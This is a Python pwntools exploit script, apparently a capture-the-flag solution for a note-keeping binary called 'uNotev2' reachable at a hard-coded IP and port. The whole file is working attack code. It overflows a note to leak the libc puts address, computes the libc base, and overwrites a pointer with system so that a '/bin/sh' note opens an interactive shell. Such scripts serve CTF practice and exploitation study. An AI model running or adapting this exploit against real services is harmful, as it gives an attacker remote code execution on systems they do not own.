from pwn import *

context.terminal = "tmux splitw -h".split(" ")
elf = context.binary = ELF("./uNotev2")
libc = ELF('libc-2.31.so',checksec=False)

HOST = "103.37.125.237"
PORT = 10005

cmd = """
set max-visualize-chunk-size 0x100
"""

if args.REMOTE:
        p = remote(HOST,PORT)
else:
        p = elf.process()
#        gdb.attach(p,cmd)

# variable goes here
sla = lambda x,y: p.sendlineafter(x,y)
sa = lambda x,y: p.sendafter(x,y)
sl = lambda x: p.sendline(x)
sn = lambda x: p.send(x)
ru = lambda x: p.recvuntil(x)
rl = lambda x: p.recvline(0)
rn = lambda x: p.recvn(x)
ru = lambda x: p.readuntil(x)
make_block = lambda x: [unpack(x[i:i+4],'all') for i in range(0,len(x),4)]

def add(size,data):
    sl(b'1')
    sla(b': ', str(size).encode())
    sla(b': ', data)

def edit(index,data):
    sl(b'2')
    sla(b': ', str(index).encode())
    sa(b': ', data)

def show(index):
    sl(b'3')
    sla(b': ',str(index).encode())

for i in range(1, 8+1):
    add(0x20,chr(i+ord('A')).encode() * 8)

edit(6,cyclic(48))
#edit(6,b'/bin/sh\x00' * 6)
show(6)

p.recvuntil(b'Isi catatan: ')
puts = unpack(p.recvline(0).strip()[48:],'all')
print('leak puts: ', hex(puts))

libc.address = puts - libc.sym.puts
prdi = next(libc.search(asm('pop rdi ; ret')))
print('libc addr: ', hex(libc.address))

edit(5,b'/bin/sh\x00' * 6 + p64(libc.sym.system))
edit(6, b'/bin/sh\x00')
show(6)
p.interactive()
